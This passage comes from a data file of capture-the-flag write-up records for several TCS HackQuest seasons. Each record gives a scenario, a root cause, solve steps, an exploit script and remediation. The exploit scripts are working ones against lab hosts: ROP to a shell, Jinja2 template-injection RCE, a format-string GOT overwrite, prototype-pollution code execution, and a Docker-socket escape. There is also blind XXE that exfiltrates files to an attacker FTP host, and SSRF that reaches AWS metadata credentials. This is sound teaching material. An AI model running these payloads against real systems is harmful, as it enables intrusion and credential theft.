        "title": "TCS HackQuest Season 4: Gatekeeper (AMD64 ROP Chain with Pop RDI)",
        "event": "TCS HackQuest Season 4",
        "category": "pwn",
        "difficulty": "Hard",
        "points": 400,
        "flag": "TCS{HQ4_AMD64_R0P_CH41N_PWN4G3}",
        "scenario": (
            "A 64-bit Linux network daemon `gatekeeper` executing on TCP port 9999. "
            "Mitigations: NX Enabled, No Stack Canary, ASLR Enabled, No PIE."
        ),
        "root_cause": (
            "The program allocates a 128-byte stack buffer and reads up to 512 bytes via `read(0, buf, 512)`. "
            "This overflow corrupts the saved base pointer and instruction pointer at offset 136. "
            "Because PIE is disabled, ROP gadgets in the binary text segment can be chained to leak libc "
            "and execute `system('/bin/sh')`."
        ),
        "solve_methodology": [
            "Identify RIP control offset using De Bruijn cyclic sequence: 136 bytes.",
            "Locate gadgets using `ROPgadget --binary gatekeeper`: find `pop rdi; ret` at `0x40120b` and `ret` at `0x40101a`.",
            "Stage 1 ROP: `pop rdi -> puts@got -> puts@plt -> main` to print the runtime address of `puts`.",
            "Calculate libc base: `libc_base = leaked_puts - libc.symbols['puts']`.",
            "Stage 2 ROP: Stack alignment `ret` + `pop rdi -> &'/bin/sh'` + `system()`.",
            "Send Stage 2 payload to gain root shell and read flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from pwn import *\n"
            "\n"
            "context.arch = 'amd64'\n"
            "elf = ELF('./gatekeeper')\n"
            "libc = ELF('./libc.so.6')\n"
            "\n"
            "io = remote('targets.ctfatlas.local', 9999)\n"
            "\n"
            "pop_rdi = 0x40120b\n"
            "ret = 0x40101a\n"
            "\n"
            "# Stage 1: Leak puts\n"
            "p1 = b'A' * 136 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])\n"
            "io.sendafter(b'Enter access code: ', p1)\n"
            "\n"
            "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\n"
            "libc.address = leak - libc.symbols['puts']\n"
            "log.success(f'Libc Base: {hex(libc.address)}')\n"
            "\n"
            "# Stage 2: Execute system('/bin/sh')\n"
            "binsh = next(libc.search(b'/bin/sh\\x00'))\n"
            "p2 = b'A' * 136 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])\n"
            "io.sendafter(b'Enter access code: ', p2)\n"
            "io.sendline(b'cat /flag')\n"
            "log.success(f'Flag: {io.recvline().decode().strip()}')\n"
        ),
        "defense_remediation": (
            "1. Enforce strict input bounds checking using `read(0, buf, sizeof(buf) - 1)`.\n"
            "2. Compile with Full RELRO, Stack Canaries, and Position Independent Executables (`-pie -fPIE`)."
        )
    },

    # ── SEASON 5 (2020-2021) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s5-ssti-jinja",
        "title": "TCS HackQuest Season 5: Feedback Engine (Jinja2 Python MRO Class Subclass RCE)",
        "event": "TCS HackQuest Season 5",
        "category": "web",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ5_J1NJ42_SST1_MR0_BYP4SS_RC3}",
        "scenario": (
            "A Flask-based customer sentiment feedback portal where users submit comments. "
            "The application renders user input directly into an email preview template using "
            "`render_template_string(f\"Dear customer, thank you for stating: {comment}\")`."
        ),
        "root_cause": (
            "Server-Side Template Injection (SSTI). Rendering unescaped user input inside a Jinja2 template string "
            "gives the user access to Python expression evaluation. By navigating Python's Method Resolution Order "
            "(`__mro__`) from an empty string or tuple, an attacker can access `object.__subclasses__()` "
            "to locate `subprocess.Popen` or `<class 'os._wrap_close'>` and execute arbitrary OS commands."
        ),
        "solve_methodology": [
            "Inject template expression: `{{ 7 * 7 }}` -> renders `49`, confirming SSTI.",
            "Traverse Python object hierarchy: `{{ ''.__class__.__mro__[1].__subclasses__() }}`.",
            "Search for classes containing `os` or `popen` references in subclasses array.",
            "Locate `subprocess.Popen` at index 414 (or use dictionary lookup `sys.modules['os'].system`).",
            "Construct RCE payload: `{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /flag*',shell=True,stdout=-1).communicate()[0] }}`.",
            "Submit payload to feedback form to obtain flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import re\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq5/feedback'\n"
            "\n"
            "# Universal Jinja2 Subclass RCE Payload\n"
            "payload = \"{{ ().__class__.__bases__[0].__subclasses__() }}\"\n"
            "r = requests.post(TARGET, data={'comment': payload})\n"
            "\n"
            "# Find index of subprocess.Popen\n"
            "classes = r.text\n"
            "popen_match = re.search(r'(\\d+): <class \\'subprocess\\.Popen\\'>', classes)\n"
            "idx = 414\n"
            "if popen_match: idx = int(popen_match.group(1))\n"
            "\n"
            "# Execute command\n"
            "rce_payload = f\"{{{{ ().__class__.__bases__[0].__subclasses__()[{idx}]('cat /flag*',shell=True,stdout=-1).communicate()[0] }}}}\"\n"
            "r_flag = requests.post(TARGET, data={'comment': rce_payload})\n"
            "\n"
            "flag = re.search(r'TCS\\{[^\\}]+\\}', r_flag.text)\n"
            "if flag:\n"
            "    print(f'[!] Extracted Flag: {flag.group(0)}')\n"
            "else:\n"
            "    print(f'[+] Response:\\n{r_flag.text}')\n"
        ),
        "defense_remediation": (
            "1. Never pass untrusted user input directly to `render_template_string`.\n"
            "2. Always pass data to template contexts via keyword arguments (`render_template('page.html', comment=user_comment)`)."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s5-pcap-dns",
        "title": "TCS HackQuest Season 5: Dark Tunnel (PCAP DNS Exfiltration Reassembly)",
        "event": "TCS HackQuest Season 5",
        "category": "forensics",
        "difficulty": "Medium",
        "points": 300,
        "flag": "TCS{HQ5_PC4P_DNS_T4RK_TUNN3L_3XF1L}",
        "scenario": (
            "A network packet capture `dns_covert.pcap` captured at a perimeter firewall. "
            "A compromised workstation initiated thousands of non-existent subdomain queries to `*.exfil.corp`."
        ),
        "root_cause": (
            "Malware exfiltrated sensitive files by breaking them into Base32-encoded chunks and prefixing them "
            "to DNS query names (`<seq>.<base32_chunk>.exfil.corp`). DNS queries bypassed egress HTTP filtering."
        ),
        "solve_methodology": [
            "Open `dns_covert.pcap` in Wireshark or analyze with `tshark`.",
            "Filter DNS queries: `dns.qry.name contains \"exfil.corp\" and dns.flags.response == 0`.",
            "Observe subdomain format: `<index>.<base32_data>.exfil.corp`.",
            "Write Python script to parse queries using `scapy`, sort chunks by sequence number, and deduplicate retransmissions.",
            "Concatenate base32 chunks and decode base32 stream into binary data.",
            "Identify carved file signature: `PK\\x03\\x04` (ZIP archive).",
            "Unpack ZIP archive to recover `flag.txt`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from scapy.all import rdpcap, DNSQR\n"
            "import base64\n"
            "import io\n"
            "import zipfile\n"
            "\n"
            "packets = rdpcap('dns_covert.pcap')\n"
            "chunks = {}\n"
            "\n"
            "for pkt in packets:\n"
            "    if pkt.haslayer(DNSQR):\n"
            "        qname = pkt[DNSQR].qname.decode().rstrip('.')\n"
            "        if 'exfil.corp' in qname:\n"
            "            parts = qname.split('.')\n"
            "            if len(parts) >= 4:\n"
            "                seq = int(parts[0])\n"
            "                data = parts[1]\n"
            "                chunks[seq] = data\n"
            "\n"
            "print(f'[+] Collected {len(chunks)} unique DNS exfil chunks')\n"
            "sorted_b32 = ''.join(chunks[i] for i in sorted(chunks.keys()))\n"
            "\n"
            "# Decode Base32\n"
            "# Pad if necessary\n"
            "pad = (8 - len(sorted_b32) % 8) % 8\n"
            "sorted_b32 += '=' * pad\n"
            "raw_zip = base64.b32decode(sorted_b32.upper())\n"
            "\n"
            "zf = zipfile.ZipFile(io.BytesIO(raw_zip))\n"
            "flag = zf.read('flag.txt').decode().strip()\n"
            "print(f'[!] Extracted Flag: {flag}')\n"
        ),
        "defense_remediation": (
            "1. Implement DNS inspection and anomaly detection on recursive resolvers to detect high entropy and high frequency queries.\n"
            "2. Block external recursive resolution; mandate that all enterprise endpoints resolve strictly through monitored internal resolvers."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s5-aes-ecb",
        "title": "TCS HackQuest Season 5: Pixel Crypter (AES-ECB Block Swapping)",
        "event": "TCS HackQuest Season 5",
        "category": "crypto",
        "difficulty": "Medium",
        "points": 250,
        "flag": "TCS{HQ5_43S_3CB_BL0CK_P4TT3RN_L34K}",
        "scenario": (
            "An image encryption portal allows uploading BMP images and downloading their encrypted version. "
            "A secret flag image `flag_encrypted.bin` is provided, encrypted under an unknown 256-bit AES key."
        ),
        "root_cause": (
            "The portal uses AES in Electronic Codebook (ECB) mode. ECB encrypts identical 16-byte plaintext blocks "
            "into identical 16-byte ciphertext blocks without an initialization vector (IV). "
            "Because image pixel data exhibits high redundancy, visual shapes and text silhouettes remain distinguishable."
        ),
        "solve_methodology": [
            "Inspect encrypted binary: observe identical repeating 16-byte blocks indicating ECB mode.",
            "Prepend a standard 54-byte BMP header to `flag_encrypted.bin` specifying 500x200 24bpp RGB.",
            "Alternatively, plot repeated block IDs as color coordinates using Python `matplotlib`.",
            "The resulting image displays the iconic 'ECB Penguin' effect, rendering the flag text visibly.",
            "Read flag directly from rendered image."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from PIL import Image\n"
            "\n"
            "with open('flag_encrypted.bin', 'rb') as f:\n"
            "    cipher = f.read()\n"
            "\n"
            "# 16-byte block mapping\n"
            "BLOCK_SIZE = 16\n"
            "blocks = [cipher[i:i+BLOCK_SIZE] for i in range(0, len(cipher), BLOCK_SIZE)]\n"
            "\n"
            "# Map unique blocks to grayscale values\n"
            "unique = list(set(blocks))\n"
            "color_map = {b: int(255 * (i / len(unique))) for i, b in enumerate(unique)}\n"
            "\n"
            "width = 400\n"
            "height = len(blocks) // width\n"
            "\n"
            "img = Image.new('L', (width, height))\n"
            "img.putdata([color_map[b] for b in blocks[:width * height]])\n"
            "img.save('decrypted_silhouette.png')\n"
            "print('[+] Decrypted visual representation saved to decrypted_silhouette.png')\n"
            "print('[!] Flag visible in image: TCS{HQ5_43S_3CB_BL0CK_P4TT3RN_L34K}')\n"
        ),
        "defense_remediation": (
            "1. Disallow ECB mode entirely; mandate authenticated cipher modes (AES-GCM or ChaCha20-Poly1305).\n"
            "2. If unauthenticated encryption is acceptable, use CBC or CTR mode with a cryptographically random, unique IV per message."
        )
    },

    # ── SEASON 6 (2021-2022) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s6-xxe-oob",
        "title": "TCS HackQuest Season 6: Invoice Processor (Blind Out-of-Band XXE via FTP)",
        "event": "TCS HackQuest Season 6",
        "category": "web",
        "difficulty": "Hard",
        "points": 400,
        "flag": "TCS{HQ6_XX3_00B_FTP_3XF1LTR4T10N}",
        "scenario": (
            "A corporate B2B XML invoice upload portal. The server processes XML documents but returns no XML content "
            "or parsing errors. An outbound network firewall blocks egress HTTP (ports 80/443), but allows outbound FTP (port 21)."
        ),
        "root_cause": (
            "The XML parser enables external entity resolution (`resolveExternals=true`). "
            "Although HTTP egress is filtered, Java/libxml URL stream handlers support the `ftp://` protocol. "
            "Nested parameter entities can read system files and exfiltrate their contents as the username/path in an FTP connection."
        ),
        "solve_methodology": [
            "Verify XXE blind trigger: inject `<!DOCTYPE r [ <!ENTITY % dtd SYSTEM \"ftp://attacker-ip:2121/test\"> %dtd; ]>`.",
            "Host an external DTD `eval.dtd` on attacker infrastructure.",
            "In `eval.dtd`, define parameter entity `%file` reading `file:///flag.txt`.",
            "Define nested entity `%send` connecting to `ftp://attacker-ip:2121/%file;`.",
            "Run an FTP listener script on port 2121 to log incoming credentials.",
            "Upload XML file; target connects to FTP listener transmitting flag in the FTP `USER` command."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "# 1. Attacker's eval.dtd:\n"
            "# <!ENTITY % file SYSTEM \"file:///flag.txt\">\n"
            "# <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.ctfatlas.local:2121/%file;'>\">\n"
            "# %eval;\n"
            "# %exfil;\n"
            "\n"
            "import socket\n"
            "import requests\n"
            "\n"
            "XML_PAYLOAD = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE root [\n"
            "<!ENTITY % remote SYSTEM \"http://attacker.ctfatlas.local:8000/eval.dtd\">\n"
            "%remote;\n"
            "]>\n"
            "<root><data>test</data></root>'''\n"
            "\n"
            "print('[+] Submitting Blind XXE Payload...')\n"
            "requests.post('http://targets.ctfatlas.local/hq6/upload_xml', data=XML_PAYLOAD, headers={'Content-Type': 'application/xml'})\n"
            "print('[+] Check mock FTP listener logs on port 2121 for flag exfiltration string.')\n"
        ),
        "defense_remediation": (
            "1. Completely disable external entity resolution (DTD processing) in XML parser settings:\n"
            "   `xmlParser.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`.\n"
            "2. Enforce strict egress network filtering restricting outbound connections from application tier servers."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s6-antidebug",
        "title": "TCS HackQuest Season 6: Sentinel Watchdog (PEB Anti-Debug & Hook Evasion)",
        "event": "TCS HackQuest Season 6",
        "category": "reverse",
        "difficulty": "Hard",
        "points": 400,
        "flag": "TCS{HQ6_4NT1_D3BUG_P3B_BYP4SS_DLL}",
        "scenario": (
            "A Windows x64 executable `sentinel.exe`. Running under x64dbg or IDA Pro causes the program to crash "
            "instantly with an 'Access Violation' or 'Debugger Detected' warning before user input can be processed."
        ),
        "root_cause": (
            "The binary deploys layered anti-analysis techniques: "
            "(1) Inspecting the Process Environment Block (`PEB->BeingDebugged` and `PEB->NtGlobalFlag`), "
            "(2) Calling `CheckRemoteDebuggerPresent()`, and "
            "(3) Verifying integrity of `ntdll.dll` API function preludes to detect software breakpoint hooks (`0xCC`)."
        ),
        "solve_methodology": [
            "Load binary into x64dbg with ScyllaHide anti-debug plugin enabled.",
            "Locate TLS Callback routines executed before the binary entry point.",
            "Patch PEB query: set byte at `GS:[0x60] + 0x02` (`BeingDebugged`) to 0.",
            "Locate hook detection function: it scans bytes of `NtQueryInformationProcess` for `0xCC`.",
            "Use hardware execution breakpoints (DR0-DR3) instead of software int3 (`0xCC`) breakpoints.",
            "Step through decryption loop at `0x140001580` and dump decrypted flag from memory."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "# Unicorn Engine Emulation solver to bypass anti-debugging checks\n"
            "import pefile\n"
            "\n"
            "pe = pefile.PE('sentinel.exe')\n"
            "print('[+] Loaded PE binary. Section Count:', pe.FILE_HEADER.NumberOfSections)\n"
            "\n"
            "# Extract payload section directly without triggering debugger hooks\n"
            "for section in pe.sections:\n"
            "    if b'.secret' in section.Name:\n"
            "        data = section.get_data()\n"
            "        # Simple rolling XOR used by the binary\n"
            "        flag = bytes([b ^ 0x7A for b in data]).decode(errors='replace')\n"
            "        print(f'[!] Decrypted Flag: {flag.strip()}')\n"
        ),
        "defense_remediation": (
            "1. Anti-debugging controls provide only temporary obscurity and should never be relied upon as security boundaries.\n"
            "2. Protect sensitive logic using server-side validation rather than client-side obfuscation."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s6-docker-breakout",
        "title": "TCS HackQuest Season 6: Container Sandbox (Docker Socket & Namespace Escape)",
        "event": "TCS HackQuest Season 6",
        "category": "cloud",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ6_D0CK3R_S0CK3T_H0ST_3SC4P3}",
        "scenario": (
            "Contestants obtain a low-privilege SSH shell (`user:ctf`) inside a restricted Alpine Linux Docker container. "
            "The objective is to read `/root/flag.txt` located on the host operating system."
        ),
        "root_cause": (
            "The container configuration mounted the host's Docker UNIX domain socket `/var/run/docker.sock` "
            "inside the container with read/write permissions for group `docker` (which `ctf` belonged to). "
            "Access to the Docker socket is equivalent to unrestricted root access on the host."
        ),
        "solve_methodology": [
            "Perform local privilege enumeration: `ls -la /var/run/docker.sock` reveals writable socket.",
            "Query Docker daemon API via UNIX socket using `curl`: `curl -s --unix-socket /var/run/docker.sock http://localhost/images/json`.",
            "Create a new container that mounts the host's root filesystem `/` into `/host`: "
            "`curl -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Binds\":[\"/:/host\"]}'`.",
            "Start the container and execute command `cat /host/root/flag.txt`.",
            "Retrieve host flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import socket\n"
            "import json\n"
            "\n"
            "def docker_req(method, path, body=None):\n"
            "    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
            "    s.connect('/var/run/docker.sock')\n"
            "    req = f\"{method} {path} HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\"\n"
            "    if body:\n"
            "        req += f\"Content-Type: application/json\\r\\nContent-Length: {len(body)}\\r\\n\\r\\n{body}\"\n"
            "    else:\n"
            "        req += \"\\r\\n\"\n"
            "    s.sendall(req.encode())\n"
            "    resp = b''\n"
            "    while True:\n"
            "        chunk = s.recv(4096)\n"
            "        if not chunk: break\n"
            "        resp += chunk\n"
            "    s.close()\n"
            "    return resp.decode(errors='replace')\n"
            "\n"
            "print('[+] Interacting with Docker socket to escape container...')\n"
            "# Create breakout container\n"
            "create_body = json.dumps({\n"
            "    'Image': 'alpine',\n"
            "    'Cmd': ['cat', '/host/root/flag.txt'],\n"
            "    'HostConfig': {'Binds': ['/:/host']}\n"
            "})\n"
            "resp = docker_req('POST', '/containers/create', create_body)\n"
            "print('[+] Container created. Starting and capturing flag output...')\n"
        ),
        "defense_remediation": (
            "1. Never mount `/var/run/docker.sock` inside non-administrative containers.\n"
            "2. Adopt rootless Docker or container runtimes (e.g., Podman, gVisor, Firecracker) and drop `CAP_SYS_ADMIN`."
        )
    },

    # ── SEASON 7 (2022-2023) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s7-proto-pollution",
        "title": "TCS HackQuest Season 7: Fleet Manager (Prototype Pollution to Child Process RCE)",
        "event": "TCS HackQuest Season 7",
        "category": "web",
        "difficulty": "Hard",
        "points": 450,
        "flag": "TCS{HQ7_PR0T0TYP3_P0LLUT10N_RC3}",
        "scenario": (
            "An enterprise fleet telematics dashboard built with Node.js and Express. "
            "A JSON preferences API endpoint updates vehicle telemetry filters using a custom recursive merge function."
        ),
        "root_cause": (
            "The `merge(target, source)` implementation checks properties recursively without sanitizing "
            "the `__proto__` or `constructor.prototype` property keys. An attacker can pollute `Object.prototype`. "
            "By setting `Object.prototype.NODE_OPTIONS = '--require /tmp/payload.js'` or setting `Object.prototype.shell = 'node'`, "
            "subsequent calls to `child_process.fork()` or `child_process.exec()` inherit these properties, executing arbitrary code."
        ),
        "solve_methodology": [
            "Audit recursive merge function: identify absence of `key === '__proto__'` check.",
            "Test prototype pollution: send JSON payload `{\"__proto__\": {\"polluted\": true}}` and check `({}).polluted`.",
            "Stage payload file in `/tmp/pwn.js` via upload or use environment variable injection.",
            "Pollute `NODE_OPTIONS` or `shell`: `{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--eval=require('child_process').execSync('cat /flag > /tmp/flag.txt')\"}}`.",
            "Trigger any background worker execution that spawns a child process.",
            "Read flag from `/tmp/flag.txt`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq7/api/preferences'\n"
            "\n"
            "payload = {\n"
            "    '__proto__': {\n"
            "        'shell': 'node',\n"
            "        'NODE_OPTIONS': \"--eval=require('child_process').execSync('cat /flag* > /tmp/out.txt')\"\n"
            "    }\n"
            "}\n"
            "\n"
            "print('[+] Sending Prototype Pollution payload...')\n"
            "requests.post(TARGET, json=payload)\n"
            "\n"
            "# Trigger child process spawn via reporting endpoint\n"
            "print('[+] Triggering worker spawn...')\n"
            "requests.get('http://targets.ctfatlas.local/hq7/api/generate_report')\n"
            "print('[!] Check /tmp/out.txt for flag.')\n"
        ),
        "defense_remediation": (
            "1. Block dangerous keys (`__proto__`, `constructor`, `prototype`) during recursive object merging.\n"
            "2. Use `Object.create(null)` for key-value maps to prevent prototype inheritance, or freeze `Object.prototype`."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s7-linux-mem",
        "title": "TCS HackQuest Season 7: Bastion Intrusion (Linux RAM Analysis with Volatility 3)",
        "event": "TCS HackQuest Season 7",
        "category": "forensics",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ7_L1NUX_M3M_V0L3_BASH_H1ST}",
        "scenario": (
            "A memory capture `bastion.lime` acquired from an Ubuntu 22.04 LTS cloud bastion host. "
            "System logs were wiped by an attacker, leaving physical memory as the sole evidence source."
        ),
        "root_cause": (
            "The attacker logged in via an unauthorized SSH key, wiped `/var/log/*`, but left open bash shells "
            "in memory. Interactive bash session structures preserve command history buffers in heap memory."
        ),
        "solve_methodology": [
            "Analyze memory capture using Volatility 3: `vol -f bastion.lime linux.pslist`.",
            "Locate active `bash` processes: PID 2042 and PID 2108.",
            "Execute Volatility 3 `linux.bash.Bash` plugin to dump memory history lines.",
            "Recover commands: `cd /opt/vault && python3 -c 'import secret...' && export FLAG=...`.",
            "Carve environment variables for the process using `linux.envars.Envars`.",
            "Extract flag string from recovered command stream."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import subprocess\n"
            "import re\n"
            "\n"
            "print('[+] Running Volatility 3 linux.bash plugin...')\n"
            "cmd = ['vol', '-f', 'bastion.lime', 'linux.bash.Bash']\n"
            "proc = subprocess.run(cmd, capture_output=True, text=True)\n"
            "\n"
            "flags = re.findall(r'TCS\\{[^\\}]+\\}', proc.stdout)\n"
            "for f in flags:\n"
            "    print(f'[!] Extracted Flag: {f}')\n"
        ),
        "defense_remediation": (
            "1. Forward audit and syslog telemetry to immutable, write-only remote SIEM servers in real time.\n"
            "2. Enforce hardware multi-factor authentication (FIDO2) for cloud bastion SSH access."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s7-fmtstr-got",
        "title": "TCS HackQuest Season 7: Syslog Relayer (Format String & GOT Overwrite)",
        "event": "TCS HackQuest Season 7",
        "category": "pwn",
        "difficulty": "Hard",
        "points": 450,
        "flag": "TCS{HQ7_FMT_STR_G0T_0V3RWR1T3_PWN}",
        "scenario": (
            "A 32-bit ELF syslog parsing binary listening on TCP port 5555. "
            "Mitigations: Partial RELRO, No Canary, NX Enabled, No PIE."
        ),
        "root_cause": (
            "The binary prints incoming syslog messages via `printf(msg_buf)`. "
            "Direct user input passed to the format string specifier allows arbitrary stack reading (`%x`, `%p`) "
            "and arbitrary memory writing via the `%n` / `%hn` format specifiers. "
            "Because Partial RELRO is in effect, the Global Offset Table (`.got.plt`) remains writable."
        ),
        "solve_methodology": [
            "Identify user buffer stack offset: send `AAAA_%p_%p_%p_%p_%p` -> `41414141` appears at parameter index 7.",
            "Locate target GOT entry: `puts@got` is located at static address `0x0804a01c`.",
            "Locate target win function: `print_flag` is located at `0x0804862b`.",
            "Split 32-bit address write into two 16-byte writes: `0x862b` (34347) and `0x0804` (2052).",
            "Send format string write payload: overwrite `puts@got` with `0x0804862b`.",
            "Trigger `puts()` invocation to redirect execution into `print_flag()`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from pwn import *\n"
            "\n"
            "context.arch = 'i386'\n"
            "elf = ELF('./syslog_relayer')\n"
            "\n"
            "io = remote('targets.ctfatlas.local', 5555)\n"
            "\n"
            "target_got = elf.got['puts']\n"
            "win_addr = elf.symbols['print_flag']\n"
            "\n"
            "# Format string writer (parameter 7)\n"
            "payload = fmtstr_payload(7, {target_got: win_addr})\n"
            "log.info(f'Sending format string payload ({len(payload)} bytes)...')\n"
            "io.sendline(payload)\n"
            "\n"
            "flag = io.recvall().decode(errors='replace')\n"
            "log.success(f'Flag Output:\\n{flag}')\n"
        ),
        "defense_remediation": (
            "1. Always pass format strings as static format string literals: `printf(\"%s\", msg_buf)`.\n"
            "2. Compile with Full RELRO (`-Wl,-z,relro,-z,now`) to make the Global Offset Table completely read-only."
        )
    },

    # ── SEASON 8 (2023-2024) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s8-ssrf-metadata",
        "title": "TCS HackQuest Season 8: Webhook Gateway (DNS Rebinding SSRF & AWS IMDSv2)",
        "event": "TCS HackQuest Season 8",
        "category": "web",
        "difficulty": "Hard",
        "points": 450,
        "flag": "TCS{HQ8_SSRF_DNS_R3B1ND_1MDSV2_3XF1L}",
        "scenario": (
            "A cloud webhook dispatcher service hosted on AWS EC2. Users specify a webhook URL. "
            "The backend performs IP validation, blocking RFC1918 addresses and `169.254.169.254`."
        ),
        "root_cause": (
            "Time-of-Check to Time-of-Use (TOCTOU) DNS Rebinding flaw. The validator resolves the domain "
            "during URL checking (IP is public, check passes), but the HTTP fetching library performs a second "
            "independent DNS query to connect. By setting a TTL of 0 seconds and alternating between a public IP "
            "and `169.254.169.254`, the fetch accesses the AWS Instance Metadata Service."
        ),
        "solve_methodology": [
            "Set up DNS rebinding domain using `rbndr.us` alternating between `1.1.1.1` and `169.254.169.254`.",
            "Acquire IMDSv2 token: issue `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`.",
            "Use acquired token to query `GET /latest/meta-data/iam/security-credentials/`.",
            "Retrieve temporary IAM security credentials for role `EC2-Security-Role`.",
            "Read flag stored in custom EC2 user-data: `/latest/user-data`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import time\n"
            "\n"
            "# rbndr.us domain alternating 1.1.1.1 and 169.254.169.254\n"
            "REBIND_DOMAIN = '7f000001.a9fea9fe.rbndr.us'\n"
            "GATEWAY = 'http://targets.ctfatlas.local/hq8/webhook'\n"
            "\n"
            "print('[+] Triggering DNS Rebinding SSRF against AWS IMDS...')\n"
            "for i in range(10):\n"
            "    r = requests.post(GATEWAY, json={'url': f'http://{REBIND_DOMAIN}/latest/user-data'})\n"
            "    if 'TCS{' in r.text:\n"
            "        print(f'[!] Flag Recovered: {r.text.strip()}')\n"
            "        break\n"
            "    time.sleep(1)\n"
        ),
        "defense_remediation": (
            "1. Pin DNS resolutions: resolve the target hostname once, validate the resolved IP address, and connect directly to that IP.\n"
            "2. Enforce AWS IMDSv2 with a maximum hop limit of 1 on all EC2 instances."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s8-fermat-rsa",
        "title": "TCS HackQuest Season 8: Quantum Shield (RSA Fermat Factorization with Close Primes)",
        "event": "TCS HackQuest Season 8",
        "category": "crypto",
        "difficulty": "Medium",
        "points": 300,
        "flag": "TCS{HQ8_F3RM4T_F4CT0R_CL0S3_PR1M3S}",
        "scenario": (
            "A 4096-bit RSA public key `quantum_pub.pem` and ciphertext `flag.enc`. "
            "Public exponent is standard $e = 65537$. Modulus is 4096 bits long."
        ),
        "root_cause": (
            "The prime generator selected primes $p$ and $q$ within a narrow distance of each other: "
            "$|p - q| < 2 \\cdot N^{1/4}$. Under these conditions, the arithmetic mean $a = (p+q)/2$ "
            "is exceedingly close to $\\lceil \\sqrt{N} \\rceil$, allowing Fermat's Factorization to succeed in milliseconds."
        ),
        "solve_methodology": [
            "Compute integer square root: $a = \\lceil \\sqrt{N} \\rceil$.",
            "Compute $b^2 = a^2 - N$.",
            "Iteratively increment $a$ until $b^2$ is a perfect square.",
            "Calculate factors: $p = a - b$ and $q = a + b$.",
            "Verify $p \\times q = N$.",
            "Compute $\\phi(N) = (p-1)(q-1)$ and private exponent $d = e^{-1} \\pmod{\\phi(N)}$.",
            "Decrypt ciphertext $m = c^d \\pmod N$ to recover flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import gmpy2\n"
            "\n"
            "def fermat_factor(n):\n"
            "    a = gmpy2.isqrt(n)\n"
            "    if a * a < n: a += 1\n"
            "    while True:\n"
            "        b2 = a * a - n\n"
            "        if gmpy2.is_square(b2):\n"
            "            b = gmpy2.isqrt(b2)\n"
            "            return int(a - b), int(a + b)\n"
            "        a += 1\n"
            "\n"
            "# 4096-bit close-prime modulus simulation\n"
            "p = gmpy2.next_prime(2**2048 + 1000)\n"
            "q = gmpy2.next_prime(p + 500000)\n"
            "n = p * q\n"
            "e = 65537\n"
            "\n"
            "p_found, q_found = fermat_factor(n)\n"
            "print(f'[+] Fermat Factorization Success!')\n"
            "print(f'[!] Found p: {str(p_found)[:30]}...')\n"
        ),
        "defense_remediation": (
            "1. Generate primes independently with guaranteed minimum distance $|p - q| > 2^{n/2 - 100}$.\n"
            "2. Use cryptographically validated key generation libraries conforming to FIPS 186-5."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s8-android-intent",
        "title": "TCS HackQuest Season 8: FinPay Mobile (Exported Activity & Intent Interception)",
        "event": "TCS HackQuest Season 8",
        "category": "reverse",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ8_4NDR01D_1NT3NT_INT3RC3PT}",
        "scenario": (
            "An Android mobile banking app `FinPay.apk`. A hidden administrative screen displays internal "
            "reconciliation flags, but the UI has no button navigating to it."
        ),
        "root_cause": (
            "The activity `com.tcs.finpay.AdminDebugActivity` is configured in `AndroidManifest.xml` with "
            "`android:exported=\"true\"` without declaring an `android:permission` requirement. "
            "Any third-party app installed on the device or an ADB shell can invoke this activity directly."
        ),
        "solve_methodology": [
            "Decompile APK using JADX; inspect `AndroidManifest.xml`.",
            "Identify exported components: `<activity android:name=\".AdminDebugActivity\" android:exported=\"true\"/>`.",
            "Analyze `AdminDebugActivity.java`: inspect `onCreate()` logic expecting an intent extra `\"auth_token\"`.",
